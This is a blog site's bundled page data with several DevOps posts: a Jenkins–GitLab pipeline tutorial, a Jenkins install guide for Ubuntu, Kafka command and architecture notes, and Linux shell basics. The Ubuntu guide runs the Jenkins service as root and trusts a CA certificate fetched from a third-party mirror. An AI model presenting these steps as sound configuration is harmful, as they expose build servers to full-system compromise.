GitLab API token and give it an ID and a description, and click Add to add the token to Jenkins: \n \n Click the dropdown next to Credentials and select the token. Then click Test Connection — you should see “Success” afterward: \n \n Click Save at the bottom of the screen to save your changes. You can view your newly created credential at Manage Jenkins → Credentials.\nNow Jenkins is ready to communicate with the GitLab API. \n Step 5: Create a Jenkins Pipeline \n On the Jenkins homepage, click New Item in the left menu bar. Enter the name for the item and select Pipeline. Click OK to create it: \n \n The next thing you will see is the pipeline configuration page. Check the box for Discard old builds and set Max # of builds to keep to a reasonable number (I chose 3 for this tutorial): \n \n Ensure that the connection you created in Step 4 is selected next to GitLab Connection: \n \n Under the Build Triggers section, check the box for Build when a change is pushed to GitLab and copy the GitLab webhook URL next to it for later. Leave the Enabled GitLab triggers section unchanged: \n \n Under the Pipeline section, select Pipeline script from SCM from the Definition dropdown (this will be the Jenkinsfile described later) and select Git from the SCM dropdown. Enter the repository URL (same as what you use for git clone). You should see an authentication error because we haven’t provided a username/password that can access your GitLab repository yet: \n \n Next to Credentials, click Add → Jenkins and fill in your GitLab username/password and click Add: \n \n Select your credential from the Credentials dropdown and the authentication error should go away. If it doesn’t, ensure you have the right username/password and that the user has access rights to the repository. \n \n Click Save at the bottom of the screen. \n Step 6: Configure a Webhook in GitLab \n We need a way for GitLab to tell Jenkins when code has been pushed to a repository — this is what webhooks are for.\nNOTE: If your Jenkins instance is running on localhost, follow these steps to allow GitLab to send requests locally:\nGo to the Admin Area\nHover over Settings and click Network\nExpand Outbound requests\nCheck the box for Allow requests to the local network from web hooks and services\nClick Save changes\nIn GitLab, go to your project and then hover over Settings at the bottom of the left menu bar, then click on Webhooks.\nEnter in the URL to your Jenkins pipeline (the one you copied from the last step) and modify it so that it follows this scheme: \n http://<gitlab-user-in-jenkins>:<token>@<host>/project/<project-name>\n \n 1 Leave the Secret Token field blank and ensure that Push events is checked. \n \n Click Add webhook and then scroll down to the bottom to see your webhook. Test it by clicking Test → Push events. You should see a 200 status code: \n If you go back to Jenkins, you should see a failed build — this is good news because it means that the webhook worked, and that Jenkins is able to listen for pushes to your GitLab repository.\nIf you inspect the Jenkins build console output, you will see something similar to this error: \n Step 7: Add a Jenkinsfile \n Inside your git repository, create a file named “Jenkinsfile” at the root level.\nPaste the following into your Jenkinsfile and push it to your repository: \n pipeline {\n    agent any\n    \n    stages {\n        stage('Build') {\n            steps {\n                sh 'mvn clean install -DskipTests'\n            }\n        }\n        stage('Test') {\n            steps {\n                sh 'mvn test'\n            }\n        }\n    }   \n}\n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 This Jenkinsfile is telling Jenkins to split the build up into stages — first a “Build” stage that builds our Maven project and then a “Test” stage that runs our JUnit tests through Maven.\nAssuming you have Maven installed and configured on the same machine that Jenkins is running on, you should see something like the following when you view your pipeline project in Jenkins: \n \n If you see a red rectangle instead of a green one in the Build or Test stages, it means that either your code failed to build or one of your unit tests failed. You can inspect the entire process by clicking on the build in the Build History section and then clicking on Console Output. \n Step 8: Email Notifications \n It is common practice to have the pipeline send an email to the user who pushed their code to let them know whether their build passed or failed.\nIf you don’t already have “Email Extension Plugin” installed, install that plugin before continuing.\nNOTE: Make sure the GitLab account you are pushing from has a valid email address — this is the address your pipeline will send an email to.\nConfigure the plugin by going to Manage Jenkins → Configure System and scrolling down to Extended E-mail Notification.\nFill in your SMTP server, click Advanced… and check the box for Use SMTP Authentication. Fill in your username (email address) and password, then check the box for Use SSL. Enter 465 for the SMTP port: \n \n Scroll back up to the top, and under Jenkins Location, change the System Admin e-mail address to “Jenkins  jenkins@jenkins ” — this will appear as the sender name in the email you will receive. \n \n Click Save at the bottom.\nIn your Jenkinsfile, add the following “post” section after the “stages” section and push it to your repository. \n \n pipeline {\n    agent any\n    \n    stages {\n        stage('Build') {\n            steps {\n                sh 'mvn clean install -DskipTests'\n            }\n        }\n        stage('Test') {\n            steps {\n                sh 'mvn test'\n            }\n        }\n    }\n    \n    post {\n        always {\n            emailext subject: \"Jenkins Build ${currentBuild.currentResult}: Job \\\"${env.JOB_NAME}\\\"\",\n                body: \"${currentBuild.currentResult}: Job \\\"${env.JOB_NAME}\\\" build ${env.BUILD_NUMBER}.\\nMore info at: ${env.BUILD_URL}\",\n                recipientProviders: [[$class: 'DevelopersRecipientProvider'], [$class: 'RequesterRecipientProvider']]\n        }\n    }\n}\n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 Here, we’re telling Jenkins to always send an email to the user after the build completes, and giving it a template for how to display the information.\nGo back to your Jenkins pipeline to see it running. If all went well, you should see something similar to the following and should have also received an email. \n \n \n Congratulations! You have successfully set up a Jenkins pipeline to automatically build Java projects from GitLab. \n"},{title:"ubuntu 安装 jenkins",frontmatter:{title:"ubuntu 安装 jenkins",date:"2021-09-06T22:12:31.000Z",tags:["jenkins","ubuntu"],categories:"deploy",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/jenkins/jenkins_linux_install.html",relativePath:"blogs/jenkins/jenkins_linux_install.md",key:"v-e6812956",path:"/blogs/jenkins/jenkins_linux_install.html",headers:[{level:2,title:"上传自定义的 ca 证书",slug:"上传自定义的-ca-证书"},{level:2,title:"修改默认执行用户",slug:"修改默认执行用户"},{level:2,title:"修改jenkins默认工作空间",slug:"修改jenkins默认工作空间"},{level:2,title:"修改插件下载地址",slug:"修改插件下载地址"}],lastUpdated:"3/6/2022, 3:57:06 PM",content:' Jenkins 是一款开源自动化服务器，可用于轻松设置持续集成和持续交付（CI / CD）管道。 \n 持续集成（CI）是DevOps的一种实践，团队成员定期将其代码更改提交到版本控制存储库，然后运行自动构建和测试。 持续交付（CD）是一系列的实践，代码更改会自动生成，测试并部署到生产中。 \n Jenkins可以作为独立应用程序安装，也可以作为Java servlet容器（例如 Apache Tomcat ）中的servlet安装，也可以作为Docker容器运行。 \n 本文介绍了如何在Ubuntu 20.04上将Jenkins作为独立服务安装 \n 安装Java \n apt  update\n apt   install  openjdk-11-jdk\n \n 1 2 安装完成后，请检查Java版本: \n java -version\n \n 1 #  安装Jenkins \n 在Ubuntu上安装Jenkins相对简单。 我们将启用Jenkins APT存储库，导入存储库GPG密钥，并安装Jenkins软件包。 \n 使用以下 wget 命令导入Jenkins存储库的GPG密钥： \n wget  -q -O - https://pkg.jenkins.io/debian/jenkins.io.key  |   sudo  apt-key  add  -\n \n 1 接下来，使用以下命令将Jenkins存储库添加到系统中： \n sudo   sh  -c  \'echo deb http://pkg.jenkins.io/debian-stable binary/ > /etc/apt/sources.list.d/jenkins.list\' \n \n 1 启用Jenkins存储库后，通过输入以下命令更新apt包列表并安装最新版本的Jenkins: \n apt  update\n apt   install  jenkins\n \n 1 2 如果收到错误消息： \n Error: W: GPG error: https://pkg.jenkins.io/debian-stable binary/ Release: The following signatures couldn’t be verified because the public key is not available: NO_PUBKEY 9B7D32F2D50582E6"\n \n 1 请将密钥导入： \n sudo  apt-key adv --keyserver keyserver.ubuntu.com --recv-keys 9B7D32F2D50582E6\n \n 1 Jenkins服务将在安装过程完成后自动启动。 您可以通过打印服务状态进行验证： \n systemctl status jenkins\n \n 1 您应该看到类似以下的内容 \n ● jenkins.service - LSB: Start Jenkins at boot  time \n     Loaded: loaded  ( /etc/init.d/jenkins ;  generated ) \n     Active: active  ( exited )  since Thu  2020 -07-16  20 :22:12 UTC ;  15min ago\n .. .\n \n 1 2 3 4 #  调整防火墙 \n 如果要在受防火墙保护的远程Ubuntu服务器上安装Jenkins，则需要打开端口8080。 \n 通常，您只想允许从特定IP地址或IP范围访问Jenkins服务器。 例如，要仅允许来自“ 192.168.121.0/24”子网的连接，可以运行以下命令： \n sudo  ufw allow proto tcp from  192.168 .121.0/24 to any port  8080 \n \n 1 如果您需要允许从任何地方访问，请执行以下操作： \n sudo  ufw allow  8080 \n \n 1 #  设置Jenkins \n 要设置新安装的Jenkins，请打开浏览器，键入域或IP地址，然后输入端口8080，http://your_ip_or_domain:8080。 \n 提示您输入在安装过程中创建的管理员密码： \n 使用 cat 在终端上显示密码： \n sudo   cat  /var/lib/jenkins/secrets/initialAdminPassword\n \n 1 您应该看到一个32个字符长的字母数字密码，如下所示： \n 06cbf25d811a424bb236c76fd6e04c47\n \n 1 从终端复制密码，将其粘贴到“管理员密码”字段中，然后单击“继续”。 \n 在下一个屏幕上，设置向导将询问您是否要安装建议的插件或要选择特定的插件。 \n 点击“安装建议的插件Install suggested plugins”选项，安装过程将立即开始。 \n 安装了插件后，系统将提示您设置第一个管理员用户。 填写所有必填信息，然后单击“保存并继续”。 \n 下一页将要求您设置Jenkins实例的URL。 该字段将填充自动生成的网址。 \n 通过单击Save and Finish按钮确认URL，然后完成设置过程。 \n 单击Start using Jenkins按钮，您将被重定向到以您在前面的步骤之一中创建的admin用户身份登录的Jenkins仪表板。 \n 至此，您已经在服务器上成功安装了Jenkins。 \n 修改Jenkins配置文件 \n 停止jenkins \n systemctl stop jenkins\n \n 1 #  上传自定义的 ca 证书 \n mkdir  /opt/jenkins/update-center-rootCAs\n wget  https://cdn.jsdelivr.net/gh/lework/jenkins-update-center/rootCA/update-center.crt -O /opt/jenkins/update-center-rootCAs/update-center.crt\n chown  root.root -R /opt/jenkins/update-center-rootCAs\n \n 1 2 3 #  修改默认执行用户 \n 最近在需要在jenkins执行shell脚本，由于Jenkins之前是默认在线安装的，这样jenkins设置了默认用户jenkins权限\n如果要执行root用户命令，则报权限错误 \n 所以要更换jenkins为root用户\n改变步骤如下：\n首先查找在线安装jenkins的目录, 然后执行 \n find  / -name  "jenkins" \n \n 1 编辑文件 /etc/default/jenkins \n vim  /etc/default/jenkins\n JENKINS_USER = root\n JENKINS_GROUP = root\n \n 1 2 3 #  修改jenkins默认工作空间 \n 在 /etc/profile 文件最后添加JENKINS_HOME \n echo   "export JENKINS_HOME=/opt/jenkins"   >>  /etc/profile\n .  /etc/profile\n \n 1 2 重新启动jenkins服务 \n systemctl start jenkins\n \n 1 确认结果 \n top \n \n 1 执行jenkins的用户变成了root \n 启动网页确认工作空间。 \n 修改插件下载地址 \n https://cdn.jsdelivr.net/gh/lework/jenkins-update-center/updates/huawei/update-center.json\n \n 1 '},{title:"Kafka 常用命令总结",frontmatter:{title:"Kafka 常用命令总结",date:"2021-12-22 09:17:42",tags:["command"],categories:"kafka",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/kafka/kafka-common-commands.html",relativePath:"blogs/kafka/kafka-common-commands.md",key:"v-5a417755",path:"/blogs/kafka/kafka-common-commands.html",headers:[{level:2,title:"启动 Kafka",slug:"启动-kafka"},{level:2,title:"停止 Kafka",slug:"停止-kafka"},{level:2,title:"Topic",slug:"topic"},{level:3,title:"创建 Topic",slug:"创建-topic"},{level:3,title:"列出所有 Topic",slug:"列出所有-topic"},{level:3,title:"查看 Topic",slug:"查看-topic"},{level:3,title:"增加 Topic 的 partition 数",slug:"增加-topic-的-partition-数"},{level:3,title:"查看 topic 指定分区 offset 的最大值或最小值",slug:"查看-topic-指定分区-offset-的最大值或最小值"},{level:3,title:"删除 Topic",slug:"删除-topic"},{level:2,title:"生产消息",slug:"生产消息"},{level:2,title:"消费消息",slug:"消费消息"},{level:3,title:"从头开始",slug:"从头开始"},{level:3,title:"从尾部开始",slug:"从尾部开始"},{level:3,title:"指定分区",slug:"指定分区"},{level:3,title:"取指定个数",slug:"取指定个数"},{level:2,title:"消费者 Group",slug:"消费者-group"},{level:3,title:"指定 Group",slug:"指定-group"},{level:3,title:"消费者 Group 列表",slug:"消费者-group-列表"},{level:3,title:"查看 Group 详情",slug:"查看-group-详情"},{level:3,title:"删除 Group 中 Topic",slug:"删除-group-中-topic"},{level:3,title:"删除 Group",slug:"删除-group"},{level:2,title:"平衡 leader",slug:"平衡-leader"},{level:2,title:"自带压测工具",slug:"自带压测工具"}],lastUpdated:"3/6/2022, 3:57:06 PM",content:" 在 0.9.0.0 之后的 Kafka，出现了几个新变动，一个是在 Server 端增加了 GroupCoordinator 这个角色，另一个较大的变动是将 topic 的 offset 信息由之前存储在 zookeeper 上改为存储到一个特殊的  topic（__consumer_offsets) 中(即broker 中)。\n下面的命令 参数 (--zookeeper localhost:2181)  替换为 (--bootstrap-server brokerhost) \n 本文测试版本：kafka_2.11-2.2.0 \n 启动 Kafka \n 后台常驻方式，带上参数  -daemon ，如： \n /usr/local/kafka/bin/kafka-server-start.sh -daemon /usr/local/kafka/config/server.properties\n \n 1 指定 JMX port 端口启动，指定 jmx，可以方便监控 Kafka 集群 \n JMX_PORT = 9991  /usr/local/kafka/bin/kafka-server-start.sh -daemon /usr/local/kafka/config/server.properties\n \n 1 #  停止 Kafka \n /usr/local/kafka/bin/kafka-server-stop.sh\n \n 1 #  Topic \n 创建 Topic \n 参数  --topic  指定 Topic 名， --partitions  指定分区数， --replication-factor  指定备份数： \n /usr/local/kafka/bin/kafka-topics.sh --create --zookeeper localhost:2181 --replication-factor  1  --partitions  1  --topic  test \n \n 1 注意，如果配置文件 server.properties 指定了 Kafka 在 zookeeper 上的目录，则参数也要指定，否则会报无可用的 brokers（下面部分命令也有同样的情况），如： \n /usr/local/kafka/bin/kafka-topics.sh --create --zookeeper localhost:2181/kafka --replication-factor  1  --partitions  1  --topic  test \n \n 1 #  列出所有 Topic \n /usr/local/kafka/bin/kafka-topics.sh --list --zookeeper localhost:2181\n \n 1 #  查看 Topic \n /usr/local/kafka/bin/kafka-topics.sh --describe --zookeeper localhost:2181 --topic  test \n \n 1 #  增加 Topic 的 partition 数 \n /usr/local/kafka/bin/kafka-topics.sh --zookeeper localhost:2181 --alter --topic  test  --partitions  5 \n \n 1 #  查看 topic 指定分区 offset 的最大值或最小值 \n time 为 -1 时表示最大值，为 -2 时表示最小值： \n /usr/local/kafka/bin/kafka-run-class.sh kafka.tools.GetOffsetShell --topic  test  --time -1 --broker-list  127.0 .0.1:9092 --partitions  0 \n \n 1 #  删除 Topic \n /usr/local/kafka/bin/kafka-topics.sh --zookeeper localhost:2181 --topic  test  --delete\n \n 1 #  生产消息 \n /usr/local/kafka/bin/kafka-console-producer.sh --broker-list localhost:9092 --topic  test \n \n 1 #  消费消息 \n 从头开始 \n /usr/local/kafka/bin/kafka-console-consumer.sh --bootstrap-server localhost:9092 --topic  test  --from-beginning\n \n 1 #  从尾部开始 \n 从尾部开始取数据，必需要指定分区： \n /usr/local/kafka/bin/kafka-console-consumer.sh --bootstrap-server localhost:9092 --topic  test  --offset latest --partition  0 \n \n 1 #  指定分区 \n /usr/local/kafka/bin/kafka-console-consumer.sh --bootstrap-server localhost:9092 --topic  test  --offset latest --partition  0 \n \n 1 #  取指定个数 \n /usr/local/kafka/bin/kafka-console-consumer.sh --bootstrap-server localhost:9092 --topic  test  --offset latest --partition  0  --max-messages  1 \n \n 1 #  消费者 Group \n 指定 Group \n /usr/local/kafka/bin/kafka-console-consumer.sh --bootstrap-server localhost:9092 --topic  test  -group test_group --from-beginning\n \n 1 #  消费者 Group 列表 \n /usr/local/kafka/bin/kafka-consumer-groups.sh --bootstrap-server localhost:9092 --list\n \n 1 #  查看 Group 详情 \n /usr/local/kafka/bin/kafka-consumer-groups.sh --bootstrap-server localhost:9092 --group test_group --describe\n \n 1 输出： \n Consumer group  'test_group'  has no active members.\n\nTOPIC           PARTITION  CURRENT-OFFSET  LOG-END-OFFSET  LAG             CONSUMER-ID     HOST            CLIENT-ID\n test              0            5                 5                 0                -               -               -\nCURRENT-OFFSET: 当前消费者群组最近提交的 offset，也就是消费者分区里读取的当前位置 \nLOG-END-OFFSET: 当前最高水位偏移量，也就是最近一个读取消息的偏移量，同时也是最近一个提交到集群的偏移量 \nLAG：消费者的 CURRENT-OFFSET 与 broker 的 LOG-END-OFFSET 之间的差距 \n \n 1 2 3 4 5 6 7 8 #  删除 Group 中 Topic \n /usr/local/kafka/bin/kafka-consumer-groups.sh --bootstrap-server localhost:9092 --group test_group --topic  test  --delete\n \n 1 #  删除 Group \n /usr/local/kafka/bin/kafka-consumer-groups.sh --bootstrap-server localhost:9092 --group test_group --delete\n \n 1 #  平衡 leader \n /usr/local/kafka/bin/kafka-preferred-replica-election.sh --bootstrap-server localhost:9092\n \n 1 #  自带压测工具 \n /usr/local/kafka/bin/kafka-producer-perf-test.sh --topic  test  --num-records  100  --record-size  1  --throughput  100  --producer-props bootstrap.servers = localhost:9092\n \n 1 "},{title:"docker kafka 外网访问不到",frontmatter:{title:"docker kafka 外网访问不到",date:"2021-12-31 18:55:48",tags:["docker"],categories:"kafka",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/kafka/kafka-docker-can-not-connect.html",relativePath:"blogs/kafka/kafka-docker-can-not-connect.md",key:"v-6ca5a34e",path:"/blogs/kafka/kafka-docker-can-not-connect.html",headers:[{level:2,title:"listeners",slug:"listeners"},{level:2,title:"advertised.listeners",slug:"advertised-listeners"}],lastUpdated:"3/6/2022, 3:57:06 PM",content:" 需要设置 advertised.listeners参数。 \n listeners \n docker中也可以用 KAFKA_LISTENERS 代替\nlisteners就是主要用来定义Kafka Broker的Listener的配置项。是kafka真正bind的地址。 \n advertised.listeners \n docker中也可以用 KAFKA_ADVERTISED_LISTENERS 代替\nadvertised.listeners参数的作用就是将Broker的Listener信息发布到Zookeeper中。是暴露给外部的listeners，如果没有设置，会用listeners。 \n"},{title:"Kafka为什么要放弃Zookeeper",frontmatter:{title:"Kafka为什么要放弃Zookeeper",date:"2021-12-31 19:18:00",tags:["kafka","zookeeper"],categories:"kafka",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/kafka/kafka-gie-up-zookeeper.html",relativePath:"blogs/kafka/kafka-gie-up-zookeeper.md",key:"v-7e5a509d",path:"/blogs/kafka/kafka-gie-up-zookeeper.html",headers:[{level:2,title:"Kafka简介",slug:"kafka简介"},{level:2,title:"Kafka和Zookeeper关系",slug:"kafka和zookeeper关系"},{level:3,title:"注册中心",slug:"注册中心"},{level:3,title:"负载均衡",slug:"负载均衡"},{level:2,title:"Controller介绍",slug:"controller介绍"},{level:2,title:"Zookeeper带来的问题",slug:"zookeeper带来的问题"},{level:3,title:"运维复杂度",slug:"运维复杂度"},{level:3,title:"Controller故障处理",slug:"controller故障处理"},{level:3,title:"分区瓶颈",slug:"分区瓶颈"},{level:2,title:"升级",slug:"升级"},{level:2,title:"总结",slug:"总结"}],lastUpdated:"3/6/2022, 3:57:06 PM",content:' 最近，confluent社区发表了一篇文章，主要讲述了Kafka未来的2.8版本将要放弃Zookeeper，这对于Kafka用户来说，是一个重要的改进。之前部署Kafka就必须得部署Zookeeper，而之后就只要单独部署Kafka就行了。[1] \n Kafka简介 \n Apache Kafka最早是由Linkedin公司开发，后来捐献给了Apack基金会。 \n Kafka被官方定义为分布式流式处理平台，因为具备高吞吐、可持久化、可水平扩展等特性而被广泛使用。目前Kafka具体如下功能： \n \n 消息队列,Kafka具有系统解耦、流量削峰、缓冲、异步通信等消息队列的功能。 \n 分布式存储系统，Kafka可以把消息持久化，同时用多副本来实现故障转移，可以作为数据存储系统来使用。 \n 实时数据处理，Kafka提供了一些和数据处理相关的组件，比如Kafka Streams、Kafka Connect，具备了实时数据的处理功能。 \n \n 下面这张图是Kafka的消息模型：[2] \n \n 通过上面这张图，介绍一下Kafka中的几个主要概念： \n \n producer和consumer: 消息队列中的生产者和消费者，生产者将消息推送到队列，消费者从队列中拉取消息。 \n consumer group:消费者集合，这些消费者可以并行消费同一个topic下不同partition中的消息。 \n broker：Kafka集群中的服务器。 \n topic：消息的分类。 \n partition：topic物理上的分组，一个topic可以有partition，每个partition中的消息会被分配一个有序的id作为offset。每个consumer group只能有一个消费者来消费一个partition。 \n Kafka和Zookeeper关系 \n Kafka架构如下图：图片从图中可以看到，Kafka的工作需要Zookeeper的配合。那他们到底是怎么配合工作呢? \n 看下面这张图： \n \n 从图中可以看到，Kafka的工作需要Zookeeper的配合。那他们到底是怎么配合工作呢？\n看下面这张图： \n 注册中心 \n broker注册 \n 从上面的图中可以看到，broker分布式部署，就需要一个注册中心来进行统一管理。Zookeeper用一个专门节点保存Broker服务列表，也就是 /brokers/ids。\nbroker在启动时，向Zookeeper发送注册请求，Zookeeper会在/brokers/ids下创建这个broker节点，如/brokers/ids/[0...N]，并保存broker的IP地址和端口。\n这个节点临时节点，一旦broker宕机，这个临时节点会被自动删除。 \n topic注册 \n Zookeeper也会为topic分配一个单独节点，每个topic都会以/brokers/topics/[topic_name]的形式记录在Zookeeper。\n一个topic的消息会被保存到多个partition，这些partition跟broker的对应关系也需要保存到Zookeeper。\npartition是多副本保存的，上图中红色partition是leader副本。当leader副本所在的broker发生故障时，partition需要重新选举leader，这个需要由Zookeeper主导完成。\nbroker启动后，会把自己的Broker ID注册到到对应topic节点的分区列表中。\n我们查看一个topic是xxx，分区编号是1的信息，命令如下： \n [ root@master ]  get /brokers/topics/xxx/partitions/1/state\n\n { "controller_epoch" :15, "leader" :11, "version" :1, "leader_epoch" :2, "isr" : [ 11,12 ,13 ] } \n \n 1 2 3 当broker退出后，Zookeeper会更新其对应topic的分区列表。 \n consumer注册 \n 消费者组也会向Zookeeper进行注册，Zookeeper会为其分配节点来保存相关数据，节点路径为/consumers/{group_id}，有3个子节点，如下图: \n \n 这样Zookeeper可以记录分区跟消费者的关系，以及分区的offset。[3] \n 负载均衡 \n broker向Zookeeper进行注册后，生产者根据broker节点来感知broker服务列表变化，这样可以实现动态负载均衡。\nconsumer group中的消费者，可以根据topic节点信息来拉取特定分区的消息,实现负载均衡。\n实际上，Kafka在Zookeeper中保存的元数据非常多，看下面这张图： \n \n 随着broker、topic和partition增多，保存的数据量会越来越大。 \n Controller介绍 \n 经过上一节的讲述，我们看到了Kafka对Zookeeper的依赖非常大，Kafka离开Zookeeper是没有办法独立运行的。那Kafka是怎么跟Zookeeper进行交互的呢? \n 如下图：[4]Kafka集群中会有一个broker被选举为Controller负责跟Zookeeper进行交互，它负责管理整个Kafka集群中所有分区和副本的状态。其他broker监听Controller节点的数据变化。 \n Controller的选举工作依赖于Zookeeper，选举成功后，Zookeeper会创建一个/controller临时节点。 \n Controller具体职责如下： \n \n 监听分区变化 \n \n 比如当某个分区的leader出现故障时，Controller会为该分区选举新的leader。当检测到分区的ISR集合发生变化时，Controller会通知所有broker更新元数据。当某个topic增加分区时，Controller会负责重新分配分区。 \n \n 监听topic相关的变化 \n 监听broker相关的变化 \n 集群元数据管理 \n \n 下面这张图展示了Controller、Zookeeper和broker的交互细节： \n \n Controller选举成功后，会从Zookeeper集群中拉取一份完整的元数据初始化ControllerContext，这些元数据缓存在Controller节点。当集群发生变化时，比如增加topic分区，Controller不仅需要变更本地的缓存数据，还需要将这些变更信息同步到其他Broker。 \n Controller监听到Zookeeper事件、定时任务事件和其他事件后，将这些事件按照先后顺序暂存到LinkedBlockingQueue中，由事件处理线程按顺序处理，这些处理多数需要跟Zookeeper交互，Controller则需要更新自己的元数据。 \n Zookeeper带来的问题 \n Kafka本身就是一个分布式系统，但是需要另一个分布式系统来管理，复杂性无疑增加了。 \n 运维复杂度 \n 使用了Zookeeper，部署Kafka的时候必须要部署两套系统，Kafka的运维人员必须要具备Zookeeper的运维能力。 \n Controller故障处理 \n Kafaka依赖一个单一Controller节点跟Zookeeper进行交互，如果这个Controller节点发生了故障，就需要从broker中选择新的Controller。如下图,新的Controller变成了broker3。 \n \n 新的Controller选举成功后，会重新从Zookeeper拉取元数据进行初始化，并且需要通知其他所有的broker更新ActiveControllerId。老的Controller需要关闭监听、事件处理线程和定时任务。分区数非常多时，这个过程非常耗时，而且这个过程中Kafka集群是不能工作的。 \n 分区瓶颈 \n 当分区数增加时，Zookeeper保存的元数据变多，Zookeeper集群压力变大，达到一定级别后，监听延迟增加，给Kafaka的工作带来了影响。 \n 所以，Kafka单集群承载的分区数量是一个瓶颈。而这又恰恰是一些业务场景需要的。 \n 升级 \n 升级前后的架构图对比如下： \n \n KIP-500用Quorum Controller代替之前的Controller，Quorum中每个Controller节点都会保存所有元数据，通过KRaft协议保证副本的一致性。这样即使Quorum Controller节点出故障了，新的Controller迁移也会非常快。\n官方介绍，升级之后，Kafka可以轻松支持百万级别的分区。\nKafak团队把通过Raft协议同步数据的方式Kafka Raft Metadata mode,简称KRaft\nKafka的用户体量非常大，在不停服的情况下升级是必要的。\n目前去除Zookeeper的Kafka代码KIP-500已经提交到trunk分支，并且计划在未来的2.8版本发布。\nKafaka计划在3.0版本会兼容Zookeeper Controller和Quorum Controller，这样用户可以进行灰度测试。[5] \n 总结 \n 在大规模集群和云原生的背景下，使用Zookeeper给Kafka的运维和集群性能造成了很大的压力。去除Zookeeper是必然趋势，这也符合大道至简的架构思想。 \n Reference \n \n \n [1]参考1:  Apache Kafka Made Simple: A First Glimpse of a Kafka Without ZooKeeper \n \n \n [2]参考2:  Kafka Controller工作原理 \n \n \n [3]参考3:  Zookeeper 在 Kafka 中的作用 \n \n \n [4]参考4:  直击Kafka的心脏——控制器 \n \n \n [5]参考5:  消息系统兴起二次革命：Kafka不需要ZooKeeper \n \n \n'},{title:"Linux 创建文件命令总结",frontmatter:{title:"Linux 创建文件命令总结",date:"2021-08-29T10:15:22.000Z",tags:["linux"],categories:"linux",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/linux/linux-creat-file.html",relativePath:"blogs/linux/linux-creat-file.md",key:"v-096861c6",path:"/blogs/linux/linux-creat-file.html",lastUpdated:"3/6/2022, 3:57:06 PM",content:' \n vi或vim \n \n [ root@localhost ~ ] # vim file1.txt  //直接创建并打开一个文件file1.txt \n \n 1 用vim 编辑器编辑文本后，如果是新创建的文件，默认保存在当前目录下，如果想保存到指定目录下，可以在vim 编辑器中，按Esc键切换到命令模式，然后用w命令写到指定目录下的指定新建文件，如写到/tmp/test.txt文件，则在vi命令模式下输入:w /tmp/test.txt写好后，在/tmp目录下新的文件test.txt就被创建了。 \n \n touch \n \n [ root@localhost ~ ] # touch file2.txt  //创建新的空文件file2.txt \n \n 1 touch的另一个作用是更改一个文件或目录的时间。 \n \n echo \n \n [ root@localhost ~ ] # echo "this is a new file" > file3.txt   //创建文件file3.txt并将this is a new file写入 \n（说明：使用 > 指令覆盖文件原内容并重新输入内容，若文件不存在则创建文件。）\n [ root@localhost ~ ] # echo "add contents" >>file3.txt    //在已存在的文件补充写入新内容add contents \n（说明：使用 >> 指令向文件追加内容，原内容将保存。）\n \n 1 2 3 4 拓展： Linux中输出重定向>和>>的区别，>是覆盖，>>是追加 \n > 会重写文件，如果文件里面有内容会覆盖。\n>> 追加文件。也就是如果文件里面有内容会把新内容追加到文件尾\n \n 1 2 \n less 、more 、cat\n三者都是将文件内容输出到标准输出，其中less和more可以分页显示，cat是显示全部。\n三者可以根据已经存在的文件创建新的文件。假设已经存在文件1.txt。\ncat 1.txt > 2.txt\nless 1.txt > 3.txt\nmore 1.txt > 4.txt\n此时创建的文件内容都和1.txt中文件内容相同。 \n \n cat命令可以一次显示整个文件，如果文件比较大，使用不是很方便；适用于文件内容少的情况。\ncat主要有三大功能：\n1）一次显示整个文件:cat filename\n2）从键盘创建一个文件:cat > filename 只能创建新文件,不能编辑已有文件.\n3）将几个文件合并为一个文件:cat file1 file2 > file \n more命令可以让屏幕在显示满一屏幕时暂停，此时可按空格健继续显示下一个画面，或按Q键停止显示。 \n less命令也可以分页显示文件，和more命令的区别就在于它支持上下键卷动屏幕，当结束浏览时，只要在less命令的提示符“: ”下按Q键即可。 \n \n cd \n \n [ root@localhost ~ ] # cd > file3.txt  //创建新的空文件file3.txt \n [ root@localhost ~ ] # cd >> file4.txt  //创建新的空文件file3.txt \n \n 1 2 cd最主要的作用是切换目录，在cd后面跟>或>>再加上文件名就可以创建一个内容为空的文件。它和echo的区别之处在于echo可写文件内容，而cd并不能。 \n'},{title:"linux添加环境变量",frontmatter:{title:"linux添加环境变量",date:"2021-10-25 23:51:00",tags:["environment"],categories:"linux",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/linux/linux_add_environment_variable.html",relativePath:"blogs/linux/linux_add_environment_variable.md",key:"v-7850d7a6",path:"/blogs/linux/linux_add_environment_variable.html",headers:[{level:2,title:"添加环境变量之前需要明白以下几点：",slug:"添加环境变量之前需要明白以下几点"},{level:2,title:"临时添加环境变量PATH：",slug:"临时添加环境变量path"},{level:2,title:"当前用户永久添加环境变量：",slug:"当前用户永久添加环境变量"},{level:2,title:"所有用户永久添加环境变量：",slug:"所有用户永久添加环境变量"},{level:2,title:"总结：",slug:"总结"}],lastUpdated:"3/6/2022, 3:57:06 PM",content:' 添加环境变量之前需要明白以下几点： \n \n \n Linux的环境变量是保存在变量PATH中(window 也是保存在PATH中)，可通过命令 echo $PATH 输出查看 \n \n \n Linux环境变量值之间是通过冒号分隔的( : ) \n \n \n 其格式为： PATH=$PATH:<PATH 1>:<PATH 2>:<PATH 3>:------:<PATH N> \n 临时添加环境变量PATH： \n 可通过export命令，如 \n export   PATH = /usr/local/nginx/sbin/: $PATH ，将/usr/local/nginx/sbin/目录临时添加到环境变量中\n \n 1 #  当前用户永久添加环境变量： \n 编辑.bashrc文件  vim ~/.bashrc     <<---- 通过这种方式，在关闭xshell后，添加的环境变量仍然生效 \n 文件末尾添加： export PATH="/usr/local/nginx/sbin/:$PATH" \n source  ~/.bashrc\n \n 1 #  所有用户永久添加环境变量： \n 编辑/etc/profile文件 vim /etc/profile    <<---- 通过这种方式，在关闭xshell后，添加的环境变量不生效 \n 文件末尾添加：export PATH="/usr/local/nginx/sbin/:$PATH" \n source   /etc/profile\n \n 1 #  总结： \n linux添加环境变量注意几点： \n \n 变量之前使用冒号分隔 \n 使用命令export \n export时，需要有$PATH \n 在文件的末尾添加 \n 配置文件有，/etc/profile  和  ~/.bashrc 